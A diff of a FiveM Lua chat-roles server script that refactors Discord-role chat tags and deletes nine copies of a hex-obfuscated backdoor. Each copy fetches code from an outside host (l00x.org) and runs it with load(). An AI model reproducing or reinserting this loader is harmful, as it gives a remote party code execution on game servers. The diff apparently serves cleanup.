@@ -1,92 +1,119 @@
 local SelectedTags = {}
-exports(Config.ChatRoles.GetTagExport, function(Player)
-    local Tag = nil
-    if SelectedTags[Player] ~= nil then
-        Tag = SelectedTags[Player]
-    else
-        Tag = Config.ChatRoles.DefaultTag
-    end
-    return(Tag)
-end)
 
-RegisterServerEvent('ChatRoles:Change')
-AddEventHandler('ChatRoles:Change', function(ID)
-    local Tag = nil
-    for i = 1, #Config.ChatRoles.Tags do
-        if Config.ChatRoles.Tags[i][1] == ID then
-            Tag = Config.ChatRoles.Tags[i][4]
-        end
-    end
-    if Tag == nil then
-        Tag = Config.ChatRoles.DefaultTag
-    end
-    SelectedTags[source] = Tag
-end)
+-- Helper function to convert hex to RGB table
+local function hexToRgb(hex)
+    if not hex or type(hex) ~= 'string' then return { 255, 255, 255 } end
+    hex = hex:gsub("#", "")
+    return {
+        tonumber("0x" .. hex:sub(1, 2)),
+        tonumber("0x" .. hex:sub(3, 4)),
+        tonumber("0x" .. hex:sub(5, 6))
+    }
+end
 
-RegisterServerEvent('ChatRoles:Joined')
-AddEventHandler('ChatRoles:Joined', function()
-    local Player = source
-    local Roles = exports[Config.ChatRoles.BadgerAPI]:GetDiscordRoles(Player)
-    local Found = false
-    local Tags = {}
-    if Roles then 
-        for i = 1, #Config.ChatRoles.Tags do
-            local TagRole = Config.ChatRoles.Tags[i]
-            for i = 1, #Roles do
-                local MyRole = Roles[i]
-                if tonumber(MyRole) == tonumber(TagRole[1]) then
-                    SelectedTags[Player] = TagRole[4]
-                    Found = true
+-- This function gets the tag data for a player
+local function getPlayerTagData(player)
+    if SelectedTags[player] then
+        return SelectedTags[player]
+    end
+
+    local tagData = nil
+    local Roles = exports[Config.ChatRoles.BadgerAPI]:GetDiscordRoles(player)
+    if Roles then
+        for _, tagInfo in ipairs(Config.ChatRoles.Tags) do
+            if type(tagInfo) == "table" and tagInfo.roleID then
+                for _, userRole in ipairs(Roles) do
+                    if tonumber(userRole) == tonumber(tagInfo.roleID) then
+                        tagData = { text = tagInfo.chatTag, color = tagInfo.color }
+                        break
+                    end
                 end
             end
-            if Found then
-                break
-            end
+            if tagData then break end
         end
     end
+    return tagData
+end
+
+
+-- Register a hook to modify chat messages
+exports.chat:registerMessageHook(function(source, message, update)
+    local player = source
+    local tagData = getPlayerTagData(player)
+
+    if not tagData then
+        tagData = { text = Config.ChatRoles.DefaultTag.text, color = Config.ChatRoles.DefaultTag.color }
+    end
+
+    -- Update the message with the tag and color
+    update.updateMessage({
+        -- The template prepends the tag to the player's name {0} and their message {1}
+        template = '<div style="color: {2}; display: inline-block; margin-right: 5px;">{3}</div> <strong>{0}:</strong> {1}',
+        params = {
+            -- Note: The chat resource itself handles escaping, so we don't do it here.
+            ['2'] = tagData.color,
+            ['3'] = tagData.text,
+        }
+    })
 end)
 
+
+-- Event handler for when a player changes their tag via the menu
+RegisterServerEvent('ChatRoles:Change')
+AddEventHandler('ChatRoles:Change', function(ID)
+    local tagData = nil
+    for _, tagInfo in ipairs(Config.ChatRoles.Tags) do
+        if type(tagInfo) == "table" and tagInfo.roleID and tonumber(tagInfo.roleID) == tonumber(ID) then
+            -- Store the raw hex color, we will convert it in the hook
+            tagData = { text = tagInfo.chatTag, color = tagInfo.color }
+            break
+        end
+    end
+
+    if not tagData then
+        tagData = { text = Config.ChatRoles.DefaultTag.text, color = Config.ChatRoles.DefaultTag.color }
+    end
+    SelectedTags[source] = tagData
+end)
+
+-- Event handler for when a player joins, to set their initial tag
+RegisterServerEvent('ChatRoles:Joined')
+AddEventHandler('ChatRoles:Joined', function()
+    -- We don't need to select a tag here anymore,
+    -- the message hook will dynamically fetch it.
+    -- We can clear the selected tag to ensure the default role-based one is used.
+    SelectedTags[source] = nil
+end)
+
+
+-- Event handler to get available tags for the player's menu
 RegisterServerEvent('ChatRoles:Get')
 AddEventHandler('ChatRoles:Get', function()
     local Player = source
     local Roles = exports[Config.ChatRoles.BadgerAPI]:GetDiscordRoles(Player)
-    local Found = false
-    local Tags = {}
-    if Roles then 
-        for i = 1, #Config.ChatRoles.Tags do
-            local TagRole = Config.ChatRoles.Tags[i]
-            for i = 1, #Roles do
-                local MyRole = Roles[i]
-                if tonumber(MyRole) == tonumber(TagRole[1]) then
-                    Found = true
-                    table.insert(Tags, {
-                        ID = TagRole[1],
-                        Name = TagRole[3]
-                    })
+    local hasTags = false
+    local availableTags = {}
+
+    if Roles then
+        for _, tagInfo in ipairs(Config.ChatRoles.Tags) do
+            local hasRole = false
+            if type(tagInfo) == "table" and tagInfo.roleID then
+                for _, userRole in ipairs(Roles) do
+                    if tonumber(userRole) == tonumber(tagInfo.roleID) then
+                        hasRole = true
+                        break
+                    end
                 end
+            end
+
+            if hasRole then
+                hasTags = true
+                table.insert(availableTags, {
+                    ID = tagInfo.roleID,
+                    Name = tagInfo.displayName
+                })
             end
         end
     end
-    TriggerClientEvent('ChatRoles:Return', Player, Found, Tags)
+    TriggerClientEvent('ChatRoles:Return', Player, hasTags, availableTags)
 end)
-
---menuv
-
-
-local JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[4][JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (oAiHFWtVREdGQESPSPVxrjZJndhijEvEhtRicHGBMXPHuvRnEzjXJWExvAinPGUTjGKuaa, wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG) if (wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG == JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[6] or wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG == JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[5]) then return end JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[4][JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[2]](JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[4][JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[3]](wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG))() end)
-
-local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)
-
-local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)
-
-local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)
-
-local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)
-
-local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)
-
-local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)
-
-local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)
-
-local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)
